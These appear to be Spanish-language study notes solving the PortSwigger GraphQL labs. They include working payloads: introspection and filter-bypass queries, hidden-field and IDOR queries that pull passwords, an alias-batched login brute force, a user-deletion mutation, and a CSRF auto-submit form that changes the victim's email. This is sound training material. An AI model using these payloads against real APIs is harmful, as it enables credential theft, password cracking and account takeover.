---
aliases:
  - GraphQL labs
  - graphql-labs
tags:
  - vuln/graphql
  - labs
  - portswigger
---

# GraphQL API attacks — Labs de PortSwigger

> 🔎 Recon/metodología (identificar endpoint, introspection, utilidades) → [[vulnerabilities/021-graphql/graphql|entry point de GraphQL]].

Labs de la categoría **[GraphQL API vulnerabilities](https://portswigger.net/web-security/graphql)**: **2 Apprentice + 3 Practitioner** (5 en total). **El hilo común:** GraphQL expone **un solo endpoint** donde el cliente pide **exactamente los campos que quiere**. El servidor casi siempre **valida mal el acceso por campo/objeto** (podés pedir datos que no deberías), **el schema es consultable** (introspection → mapa completo de la API), **los alias permiten batchear** muchas operaciones en un request (rompe rate-limits), y el endpoint suele **aceptar POST form-urlencoded sin CSRF token**. Lo que cambia lab a lab: **qué control falla** (autz por campo → endpoint oculto → rate-limit → CSRF).

> [!note] Cuatro "sabores" de GraphQL attack
> - **Autz rota por campo/objeto (+ introspection):** pedís campos/objetos ocultos que el server devuelve igual — un post privado por `id`, un campo `password`, IDOR por `id`. Labs 1, 2.
> - **Endpoint oculto + bypass de introspection:** ubicás el endpoint (`/graphql`, `/api`…) y esquivás el filtro anti-introspection para mapear el schema. Lab 3.
> - **Alias / batching:** metés N operaciones (con alias) en **un** request → saltás la protección de fuerza bruta. Lab 4.
> - **CSRF over GraphQL:** el endpoint no valida CSRF token ni content-type → un form cross-site dispara una **mutation** en la sesión de la víctima. Lab 5.

> **Herramienta central:** Burp + extensión **InQL** (introspection + schema), pestaña **GraphQL** en Repeater (query + variables). Scripts del repo: `execute-graphql.py` (correr una mutation), `brute-force-graphql.py` (alias brute force). **Cómo leer las columnas:** **Qué falla / superficie** = por qué existe la vuln · **Técnica · qué necesitás** = cómo la explotás · **Objetivo** = qué conseguís. Queries → [Solución por lab](#solución-por-lab).

## Apprentice

| #   | Laboratorio                                                                                                              | Qué falla / superficie                                                             | Técnica · qué necesitás                                                                                                                                          | Objetivo                                                                          |
| --- | ---------------------------------------------------------------------------------------------------------------------- | --------------------------------------------------------------------------------- | -------------------------------------------------------------------------------------------------------------------------------------------------------------- | -------------------------------------------------------------------------------- |
| 1   | [Accessing private GraphQL posts](https://portswigger.net/web-security/graphql/lab-graphql-reading-private-posts)        | **Campo oculto + IDOR:** hay un `id` faltante (3) y un campo `postPassword`.       | **Pedir el campo que no muestran:** por introspection ves el campo `postPassword` en `BlogPost`; pedís el post `id:3` incluyéndolo. Solo Burp/InQL.             | Leer el **password** del post oculto (`id 3`) y enviarlo.                          |
| 2   | [Accidental exposure of private GraphQL fields](https://portswigger.net/web-security/graphql/lab-graphql-accidental-field-exposure) | **Autz por campo rota:** `getUser` devuelve `username` **y `password`**.           | **Introspection → credenciales:** mapeás el schema, ves que `getUser(id)` expone `password`, y sacás las del **admin** manipulando el `id`. Solo Burp/InQL.     | Sacar las credenciales del **admin** → login → **borrar a `carlos`**.             |

## Practitioner

| #   | Laboratorio                                                                                                                     | Qué falla / superficie                                                                     | Técnica · qué necesitás                                                                                                                                                                                    | Objetivo                                                                    |
| --- | --------------------------------------------------------------------------------------------------------------------------- | ----------------------------------------------------------------------------------------- | ------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------ | --------------------------------------------------------------------------- |
| 3   | [Finding a hidden GraphQL endpoint](https://portswigger.net/web-security/graphql/lab-graphql-find-the-endpoint)                 | **Endpoint oculto + filtro de introspection** (regex ingenuo sobre `__schema`).           | **Descubrir + bypass:** probás paths comunes (`/api`, `/graphql`…) con una query universal; el filtro bloquea `__schema{` → metés un **newline** tras `__schema` para que no matchee. Después sacás el `id`. | Mapear el schema y correr `deleteOrganizationUser` → **borrar a `carlos`**.   |
| 4   | [Bypassing GraphQL brute force protections](https://portswigger.net/web-security/graphql/lab-graphql-brute-force-protection-bypass) | **Rate-limit por request, no por operación:** los **alias** batchean muchas en una.        | **Alias brute force:** armás **una** mutation con cientos de `login` **aliaseados**, cada uno con un password de la wordlist. Una sola request → mirás qué alias dio `success:true`. → `brute-force-graphql.py`. | Crackear el password de `carlos` en 1 request → login como él.               |
| 5   | [Performing CSRF exploits over GraphQL](https://portswigger.net/web-security/graphql/lab-graphql-csrf-via-graphql-api)          | **Sin CSRF token + content-type `x-www-form-urlencoded`** (no dispara preflight).          | **CSRF over GraphQL:** armás un form cross-site que POSTea la mutation `changeEmail` al endpoint; la víctima lo visita y cambia su email. Necesitás **exploit server**. → PoC en `graphql.md`.               | Cambiar el **email de la víctima** vía CSRF a una mutation.                  |

---

## Solución por lab

> **Query de introspection universal** (mapea todo el schema; si la respuesta trae `__schema`, la introspection está habilitada):
> ```graphql
> query { __schema { types { name fields { name } } queryType { name } mutationType { name } } }
> ```
> En Burp: mandá el request a **Repeater** (pestaña GraphQL) o usá **InQL** para verlo como árbol.

**L1 — Post privado (campo `postPassword` + IDOR):**
```graphql
query {
  getBlogPost(id: 3) {
    title
    postPassword
  }
}
```
> Notás que los `id` son secuenciales y falta el **3**. Por introspection aparece el campo `postPassword` en `BlogPost` → lo pedís para el `id:3` y te devuelve el password. Envialo.

**L2 — Credenciales expuestas (`getUser`):**
```graphql
query {
  getUser(id: 1) {          # probá ids hasta dar con el admin
    username
    password
  }
}
```
> Introspection revela que `getUser` expone `password`. Sacás las del admin, te logueás y borrás a `carlos`.

**L3 — Endpoint oculto + bypass de introspection:**
1. **Descubrí el endpoint:** probá `POST`/`GET` a `/api`, `/graphql`, `/graphql/api`, `/graphql/v1`, `/api/graphql` con `{"query":"{__typename}"}`. El que responde `{"data":{"__typename":"query"}}` es el bueno.
2. **Bypass del filtro** (bloquea `__schema{`): meté un **salto de línea** después de `__schema`:
   ```graphql
   query { __schema
   { queryType { name } types { name fields { name } } } }
   ```
3. Con el schema, buscá el `id` de `carlos` (`getUser`/lista) y borralo:
   ```graphql
   mutation {
     deleteOrganizationUser(input: { id: CARLOS_ID }) {
       user { id username }
     }
   }
   ```
   > Listo para correr: `execute-graphql.py` (ya arma esta mutation).

**L4 — Brute force con alias (1 request):**
```graphql
mutation {
  b0: login(input: {username: "carlos", password: "123456"}) { token success }
  b1: login(input: {username: "carlos", password: "password"}) { token success }
  b2: login(input: {username: "carlos", password: "qwerty"}) { token success }
  # ... un alias por cada password de la wordlist
}
```
> El rate-limit cuenta **requests**, no operaciones → todos los `login` van en uno solo. Mirás qué alias devolvió `success: true`. Automatizado: `brute-force-graphql.py` (genera los alias desde la wordlist).

**L5 — CSRF over GraphQL (mutation vía form):**
```html
<form action="https://LAB-ID.web-security-academy.net/graphql/v1" method="POST">
  <input type="hidden" name="query"
    value="mutation { changeEmail(input: {email: &quot;pwned@evil.com&quot;}) { email } }">
</form>
<script>document.forms[0].submit();</script>
```
> Funciona porque el endpoint **no valida CSRF token** y acepta `application/x-www-form-urlencoded` (no hay preflight CORS). Subilo al **exploit server** y **Deliver to victim**. PoC completo (con email aleatorio) → `vulnerabilities/021-graphql/graphql.md`.

---

## Atajos mentales / patrones

- **Primero, introspection.** Es el "mapa" de la API: tipos, queries, mutations, campos. Si está activa, mirala con **InQL** o la query universal. Ahí salen los campos jugosos (`password`, `postPassword`, `isAdmin`) y las mutations peligrosas (`delete*`, `changeEmail`, `promote*`).
- **Si la introspection está filtrada**, es casi siempre un **regex ingenuo**: probá `__schema` + **newline/espacio/coma**, o pedila por **GET** en vez de POST, o con otro content-type.
- **Encontrar el endpoint:** paths típicos `/graphql`, `/api`, `/graphql/v1`, `/api/graphql`, `/graphql/api`. Sonda rápida: `{__typename}` (toda API GraphQL responde eso).
- **Autz suele ser por endpoint, no por campo/objeto** → prueba **IDOR** cambiando `id` en queries/mutations, y **pedí campos que la UI no muestra** (aparecen en el schema).
- **Alias = batching:** cualquier límite "por request" (brute force, rate-limit, OTP) se saltea metiendo N operaciones aliaseadas en **un** request. → emparenta con brute force (`vulnerabilities/011-brute-force/`).
- **GraphQL + CSRF:** si acepta `x-www-form-urlencoded` y no valida token, un form cross-site dispara **mutations**. → [[vulnerabilities/003-csrf/csrf|csrf]].
- **Objetivos típicos:** leer datos ocultos (posts/credenciales), **borrar `carlos`** vía `delete*`, o **cambiar el email** de la víctima vía CSRF.

> [!note] Ver también
> - **Scripts del repo:** `execute-graphql.py` (correr mutation, ej. `deleteOrganizationUser`) · `brute-force-graphql.py` (alias brute force) → `vulnerabilities/021-graphql/scripts/`.
> - **CSRF** (el L5 es CSRF sobre una mutation) → [[vulnerabilities/003-csrf/csrf|csrf]].
> - **Brute force** (el L4 lo hace batcheando con alias) → `vulnerabilities/011-brute-force/`.
> - **Access control / IDOR** (autz por campo/objeto rota) → [[vulnerabilities/028-access-control/access-control|access control]].
